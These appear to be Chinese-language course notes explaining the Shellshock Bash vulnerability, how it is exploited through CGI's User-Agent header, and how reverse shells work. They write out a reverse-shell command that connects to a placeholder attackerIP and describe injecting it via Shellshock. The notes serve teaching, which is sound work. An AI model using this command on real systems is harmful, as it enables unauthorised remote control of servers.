---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Shellshock

!!! abstract "Abstract"

	Shellshock 攻击于 2014 年 9 月 24 日被披露，是一个针对 Bash 中函数定义的漏洞，攻击者可以通过构造特定的环境变量来执行任意命令。该漏洞影响了许多 Unix 和 Linux 系统，尤其是那些使用 Bash 作为默认 shell 的系统。

## Shellshock Vulnerability

### Defining Functions in Shell

和其他语言一样，Shell 也是一种编程语言，在 Shell 脚本中，我们可以定义函数：

![](../../../../../assets/Pasted%20image%2020250705125915.png)

如上图，第一行我们定义了一个函数 `foo()`，并可以直接调用，同时，我们还可以用 `declare -f` 命令来查看当前 Shell 中定义的函数，用 `unset -f` 命令来删除一个函数
***
### Passing Function to Child Process

在 Shell 中，我们有两种方法将一个函数传递给子进程，第一种方法是在父 Shell 也是一个 bash 的情况下，在父 Shell 已经定义好函数的情况下，使用 `export -f` 命令，子进程会自动继承这个函数：

![](../../../../../assets/Pasted%20image%2020250705130411.png)

第二种方法是在父 Shell 不是一个 bash 甚至没有运行 bash 的情况下，我们可以通过环境变量来传递函数给子进程：

![](../../../../../assets/Pasted%20image%2020250705134339.png)

我们通过环境变量的定义和传递将函数的定义当做一个字符串完整的传到子进程中，可以看到，在父进程和子进程中，这个 `foo` 函数始终都没有被当做是一个真正的函数，随后子进程就拿到了整个函数的字符串定义
***
### Shellshock Vulnerability

如果，子进程将我们拿到的字符串定义解析成了一个函数，那么就会有其他额外的危险发生，如下图，我们在原来的函数定义后注入一句其他的命令，在父进程中，这个环境变量仍然只是一个字符串，并没有将其当做是函数定义，但当我们将这个环境变量传递给子进程时，子进程会将这个字符串当做是一个函数定义来解析，而我们附加注入的命令同样也能被执行

![](../../../../../assets/Pasted%20image%2020250705134454.png)

那么为什么会这么发生呢？在一个有 Shellshock 漏洞的 Shell 中，在启动时，Shell 会检查环境变量中是否有类似函数定义的情况，如果有，它会将这个函数定义解析成一个真正的函数，这样就会导致我们注入的命令被执行

!!! note "Mistake in the Source Code"

	在 Bash 的源代码当中，它会在环境变量当中寻找有没有形如 `() {` 开头的字符串，如果发现有，那么它会去掉等号，形成一个真正的函数定义，而我们注入的命令被视作是函数定义后附加的语句，Bash 定义的函数还是 `parse_and_execute`，不仅解析了我们定义的函数，还执行了我们注入的命令
	
	![](../../../../../assets/Pasted%20image%2020250705135230.png)

- 从本质上来说，从数据（环境变量）到代码（函数定义）的转换是 Shellshock 漏洞的核心问题

Bash 解决这个问题的方法是，当识别到形如`() {` 的字符串时，Bash 会将其视为一个函数定义，保存到一个专门的环境变量 `BASH_FUNC_` 当中：

![](../../../../../assets/Pasted%20image%2020250705140047.png)

如上图，符号 `$$` 表示当前进程的 PID，Bash 会将这个函数定义保存到 `BASH_FUNC_foo` 的环境变量当中，通过专门的标记将这个环境变量标记为一个函数定义并特别对待，这样既不会被当做是一个普通的字符串来处理，也不去执行里面的内容
***
## Exploit the Vulnerability

> 通过上面的描述，我们可以知道，要实现 Shellshock 攻击，其核心在于两点，第一，子进程需要是一个 Bash 进程，第二，对于输入，我们必须通过环境变量的方式进行传递，其他方法无法触发漏洞

### Shellshock Attack on CGI: How CGI Works

Common Gateway Interface（CGI）是一种标准的协议，用于 Web 服务器和外部程序之间的通信。CGI 程序通常是用来处理 HTTP 请求并生成动态内容的

当一个用户需要调用一个 CGI 程序时，他会发送一个 HTTP 请求到 Web 服务器（例如 Apache），Web 服务器会根据请求的 URL（通常以 CGI 结尾）找到对应的 CGI 程序，然后创建一个子进程，将请求的参数作为环境变量传递给 CGI 程序，CGI 程序会处理这些环境变量，将结果送还给 Web 服务器，Web 服务器再生成一个 HTTP 响应返回给用户

在过去，CGI 通常是使用 Bash 脚本来编写的，同时 CGI 程序通常会从 Web 服务器继承环境变量来 获取参数，这是满足我们 Shellshock 攻击的两个条件

!!! example "Example"

	![](../../../../../assets/Pasted%20image%2020250705141325.png)
	
	如上图，我们写了一个非常简单的 CGI 程序，输出当前进程的环境变量，可以看到，我们确实得到了含有环境变量的 HTTP 响应
	
	最重要的是，我们传送的 HTTP 请求当中什么被传递给了 CGI 程序的环境变量，这其中有一个叫 User-Agent，它代表着浏览器的用户代理信息
	
	我们可以利用 `curl` 命令行工具来发送一个 HTTP 请求，模拟一个浏览器的行为，并在 User-Agent 中注入一个任意内容：
	
	![](../../../../../assets/Pasted%20image%2020250705142121.png)
	
	可以看到，我们注入的内容成功地成为了 CGI 程序的环境变量，那么我们换一个注入 Payload，就可以实现命令的执行
	
	- 一个有意思的现象是，如果我们利用这种方式创建文件，我们会发现这个文件的拥有者叫 `www-data`，这是因为 CGI 程序是由 Web 服务器（例如 Apache）以 `www-data` 用户的身份运行的，所以创建的文件也会以 `www-data` 用户的身份拥有。当然，这个用户通常是一个低权限用户，并不能执行很多操作
***
## Reverse Shell

### Reverse Shell Overview

Reverse Shell 的主要架构如下图：

![](../../../../../assets/Pasted%20image%2020250705143458.png)

对于我们所熟知的远程 Shell 例如 ssh, rsh，它们的工作方式是客户端主动连接到服务器端，服务器端经过权限授予提供一个 Shell 供客户端使用，而 Reverse Shell 则是在服务器端启动一个 shell，而输入和输出都通过网络传输与攻击者机器通信
***
### Implementation

要实现 Reverse Shell 也非常简单，我们在攻击者机器上运行一个监听端口的程序（通过命令行 `nc -lv port`），等待被攻击者机器连接，然后在被攻击者机器上运行 `bash -i >/dev/tcp/attackerIP/port 0<&1 2>&1` 来连接到攻击者机器

- 其中 `-i` 表示交互式模式，`>/dev/tcp/attackerIP/port` 表示将 shell 程序的标准输出设备 stdout 被重定向到一个指定的 TCP 连接。在 unix 系统中，stdout 的文件描述符为 1
- 文件描述符 0 表示标准输入设备 stdin，`0<&1` 表示使用标准输出设备作为标准输入设备。由于标准输出已经被重定向到 TCP 连接，因此标准输入也用同一个 TCP 连接
- 文件描述符 2 表示标准错误 stderr，`2>&1` 表示错误输出也被重定向到同一个 TCP 连接
	- 也可以使用 `2>&0`

![](../../../../../assets/Pasted%20image%2020250705145155.png)

如上图，左边两个终端均为攻击者机器，右边的终端为被攻击者机器，实现了 Reverse Shell 的效果，从效果上来看，Reverse Shell 和远程 Shell 的效果是一样的

结合 Shellshock，只要我们将命令 `/bin/bash -i >/dev/tcp/attackerIP/port 0<&1 2>&1` 注入到 CGI 程序的环境变量中，就可以实现 Reverse Shell 的攻击，从而做到获取被攻击者机器的 Shell，做一些更进一步的恶意操作






